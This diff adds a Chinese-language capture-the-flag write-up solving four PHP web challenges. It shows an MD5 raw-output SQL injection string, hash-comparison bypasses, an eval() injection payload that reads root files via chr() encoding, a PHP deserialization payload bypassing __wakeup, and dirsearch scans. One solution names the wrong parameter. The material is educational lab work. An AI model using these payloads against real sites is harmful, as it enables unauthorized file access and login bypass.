@@ -1,0 +1,180 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<h1>[BJDCTF2020]Easy MD5 1</h1>
+<p>burp抓包，发现传入的参数的语句为：</p>
+<p>Hint: select * from 'admin' where password=md5($pass,true)</p>
+<p><img alt="" height="311" src="image\cc68906d2e5647649ced6bb8e8cfaffa.png" width="1172"/></p>
+<blockquote>
+<p>md5函数介绍为：</p>
+<p>md5( string , raw )</p>
+<p>string : 规定需要计算的字符串</p>
+<p>raw : 规定十六进制或二进制输出格式。</p>
+<p>        true：16字符二进制格式</p>
+<p>        false(默认): 32字符十六进制数</p>
+</blockquote>
+<p>md5 true参数漏洞有</p>
+<p>ffifdyop字符串会造成漏洞。md5('ffifdyop',true)=’or’6xxxxxx</p>
+<p>因此传入ffifdyop之后，数据库查询语句变为：</p>
+<p>select * from ‘admin’ where password= '' or ’6xxxxxx ’ ，变成 ‘’ or 6，可以得到</p>
+<p><img alt="" height="396" src="image\3fbb37e896364319a8beda6064b0000e.png" width="1123"/></p>
+<p>查看源码得知：</p>
+<pre><code class="language-php">&lt;!--
+$a = $GET['a'];
+$b = $_GET['b'];
+
+if($a != $b &amp;&amp; md5($a) == md5($b)){
+    // wow, glzjin wants a girl friend.
+--&gt;</code></pre>
+<p>要满足a ！=b ，且md5($a) == md5($b).php弱类型比较，</p>
+<p>因此传入a=240610708  b=QNKCDZO。</p>
+<p>这两个md5加密后为0e开头。弱类型比较满足判断。</p>
+<p>又得到一段代码</p>
+<pre><code class="language-php"> &lt;?php
+error_reporting(0);
+include "flag.php";
+
+highlight_file(__FILE__);
+
+if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){
+    echo $flag;
+} </code></pre>
+<p>要满足param1!==param2,并且md5(param1)===md5(param2). ===强类型比较，</p>
+<p>不过md5函数仍有一个漏洞，当我们输入的值为数组时，会返回NULL值，NULL===NULL绕过。</p>
+<p>因此post传入param1[]=1,param2[]=2.</p>
+<p><img alt="" height="777" src="image\4fe2c2ffecd747d687c163524b0d7741.png" width="1200"/></p>
+<p> 得到flag。</p>
+<h1>[RoarCTF 2019]Easy Calc 1</h1>
+<p><span style="color:#0d0016;">查看源码，还是没思路。看别人题解可知：</span></p>
+<p><span style="color:#0d0016;">查看源码可以得到：</span></p>
+<pre id="line1"><span style="color:#0d0016;">url:"calc.php?num="+encodeURIComponent($("#content").val()),</span></pre>
+<p><span style="color:#0d0016;">访问calc.php.</span></p>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+if(!isset($_GET['num'])){
+    show_source(__FILE__);
+}else{
+        $str = $_GET['num'];
+        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
+        foreach ($blacklist as $blackitem) {
+                if (preg_match('/' . $blackitem . '/m', $str)) {
+                        die("what are you want to do?");
+                }
+        }
+        eval('echo '.$str.';');
+}
+?&gt;</code></pre>
+<p><strong>PHP的<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&amp;spm=1001.2101.3001.7020" title="字符串">字符串</a>解析特性简单介绍:</strong></p>
+<p><span style="color:#0d0016;">假如waf不允许num变量传递字母：</span></p>
+<p><span style="color:#0d0016;">http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话</span></p>
+<p><span style="color:#0d0016;">那么我们可以在num前加个空格：</span></p>
+<p><span style="color:#0d0016;">http://www.xxx.com/index.php? num = aaaa</span></p>
+<p><span style="color:#0d0016;">这样waf就找不到num这个变量了，因为现在的变量叫“  num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</span></p>
+<p><span style="color:#0d0016;">scandir(' / ')扫描根目录下所有文件。</span></p>
+<pre><code class="language-php">?  num=print_r(scandir('/'));
+// 然而因为单引号被过滤。用chr(47)来绕过。（chr(47)是 / ）
+？ num=print_r(scandir(chr(47)));</code></pre>
+<p><img alt="" height="201" src="image\ad0f411694ce4a9e906feec9616f5632.png" width="1200"/></p>
+<p><span style="color:#0d0016;"> 发现flag的踪迹，f1agg</span></p>
+<p><span style="color:#0d0016;">读取f1agg文件    用file_get_contents('/f1agg').</span></p>
+<pre><code class="language-php">? num=file_get_contents('/f1agg');
+// 因为单引号过滤，用chr()绕过，/f1agg分别对应chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)
+? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></pre>
+<p><img alt="" height="333" src="image\de0831d60f4e43e788b81e4e21d98204.png" width="1200"/></p>
+<p> 得到flag。</p>
+<p><img alt="" height="182" src="image\466f1fc90c1848f0a40d7fa8ab4abf19.png" width="1200"/></p>
+<h1>[极客大挑战 2019]PHP1</h1>
+<p><span style="color:#0d0016;">题目提到他经常备份，dirsearch扫描一下他的可能的备份文件。</span></p>
+<p><span style="color:#0d0016;">python dirsearch.py -u http://04eb2456-aa7f-470f-912b-f0854e6a5f0d.node4.buuoj.cn:81 -e * -w db/dicc.txt</span></p>
+<p><span style="color:#0d0016;">探测到 www.zip文件</span></p>
+<p><span style="color:#0d0016;">打开发现flag.php，输入发现flag是假的。</span></p>
+<p><span style="color:#0d0016;">然后继续看class.php</span></p>
+<pre><code class="language-php">&lt;?php
+include 'flag.php';
+
+
+error_reporting(0);
+
+
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
+
+    function __wakeup(){
+        $this-&gt;username = 'guest';
+    }
+
+    function __destruct(){
+        if ($this-&gt;password != 100) {
+            echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";
+            echo "You name is: ";
+            echo $this-&gt;username;echo "&lt;/br&gt;";
+            echo "You password is: ";
+            echo $this-&gt;password;echo "&lt;/br&gt;";
+            die();
+        }
+        if ($this-&gt;username === 'admin') {
+            global $flag;
+            echo $flag;
+        }else{
+            echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!";
+            die();
+
+            
+        }
+    }
+}
+?&gt;</code></pre>
+<p><span style="color:#0d0016;">index.php文件里有</span></p>
+<pre><code class="language-php">    &lt;?php
+    include 'class.php';
+    $select = $_GET['select'];
+    $res=unserialize(@$select);
+    ?&gt;</code></pre>
+<p><span style="color:#0d0016;">代码审计，发现这是一道反序列化的题目。</span></p>
+<p><span style="color:#0d0016;">因此我们要满足，Name类里，</span></p>
+<p><span style="color:#0d0016;">$this-&gt;password == 100 ，$this-&gt;username === 'admin' ，并且绕过_wakeup()魔法函数</span></p>
+<p><span style="color:#0d0016;">因此我们给select传入修改后的Name类的序列化</span></p>
+<p><span style="color:#0d0016;">?select = O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;};</span></p>
+<p><span style="color:#0d0016;">不知道为什么，自己手工写出来的，他不识别，最好用php编辑器出来的复制运用。因此用下面的，不用上面这个。</span></p>
+<p><img alt="" height="546" src="image\a5afb9fcce1a4ed6bb307b88f6aad4d9.png" width="1200"/></p>
+<p>(1)因为Name类里属性定义是private类型，因此序列化之后会在 %00Name%00username。php在线编辑器帮我们序列化之后并不会显示%00。需要我们自己补上。</p>
+<pre>?select = O:4:"Name":2:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}</pre>
+<p>(2)调用unserialize()时会自动调用魔法函数wakeup(),可以通过改变属性数绕过，把<code>Name</code>后面的2改为3或以上即可</p>
+<pre>?select = O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}</pre>
+<p><span style="color:#0d0016;">(3)url不识别"",因此urlencode一下。</span></p>
+<p><span style="color:#0d0016;">hackbar loadurl 一下 execute得到flag</span></p>
+<p><img alt="" height="767" src="image\6e1201733b574cfe9bfbbd7ea29e5b49.png" width="1200"/></p>
+<h1>ACTF2020 新生赛]BackupFile 1</h1>
+<p><span style="color:#0d0016;">Try to find out source file! </span></p>
+<p><span style="color:#0d0016;">之后就没有任何信息了。用dirsearch扫描一下目录：</span></p>
+<p><span style="color:#0d0016;">-u+地址 -e选择语言 -w选择字典</span></p>
+<p><span style="color:#0d0016;">python dirsearch.py -u http://26aff866-378e-4d85-8ee9-73dded16a211.node4.buuoj.cn:81 -e * -w db/dicc.txt</span></p>
+<p><span style="color:#0d0016;">发现index.php.bak备份文件。</span></p>
+<p><span style="color:#0d0016;">访问下载得到</span></p>
+<pre><code class="language-php">&lt;?php
+include_once "flag.php";
+
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit("Just num!");
+    }
+    $key = intval($key);
+    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo "Try to find out source file!";
+}
+</code></pre>
+<p>代码审计，根据php==弱比较，传入?num=123即可满足条件，得到flag。</p>
+</div>
+</div>
